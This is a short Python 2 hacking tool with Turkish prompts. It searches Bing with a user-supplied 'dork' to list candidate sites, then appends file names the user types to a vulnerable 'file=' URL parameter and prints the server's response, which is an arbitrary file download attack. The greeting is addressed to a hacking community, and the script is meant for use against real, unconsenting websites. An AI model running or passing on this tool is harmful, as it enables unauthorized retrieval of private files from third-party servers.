import mechanize
import requests
import re
import time
import sys
from colorama import Fore, Back, Style, init
red     = Fore.RED
cyan    = Fore.CYAN
blue    = Fore.BLUE
green   = Fore.GREEN
white   = Fore.WHITE
yellow  = Fore.YELLOW
magenta = Fore.MAGENTA
bright  = Style.BRIGHT
links = []
link_error = ["File extension is forbidden",
              "Error - wrong file extension.",
              ]
def site_tara(dork, page): #thx to ihan3t
    tarananSayfa = 1
    while (tarananSayfa <= page):

        try:
            r = requests.get('http://www.bing.com/search?q={0}&first={1}'.format(dork, str(tarananSayfa)), verify=False)
            link = re.findall('<h2><a href="(.+?)"', r.text)
            map(lambda x: links.append(x) if x not in links else 0 , link)
            tarananSayfa += 1
        except Exception as ex:
            print "[-]Hata oluÅŸtu: {0}".format(ex.message)

    print links
print green + "Hackno tum tht ailesine iyi gunler diler (:"
print yellow + "Url'yi 'www.example.com/file=' seklinde girin"
print yellow + "eger url adresiniz yoksa bos birakin 'dork' yazin. Daha sonra dorkunuzu girin. sizin icin cikan siteleri siralayabilirim."

url = raw_input(bright + yellow + "[*]Url: ")
if url == "dork":
    dork = raw_input(bright+yellow+"[*]Dork: ")
    site_tara(dork, 10)
else:
    while True:
        iFile = raw_input(bright+yellow+"[*]Indirmek istediginiz dosya adini girin: ")
        yeni_url = url + iFile
        session = requests.Session()
        ac = session.post(yeni_url)
        for i in link_error:
            if i == ac.content:
                print red + "[-]Acik yok veya yanlis bir dosya girdiniz. Tekrar deneyin"
                sys.exit()
            else:
                pass
        print ac.content
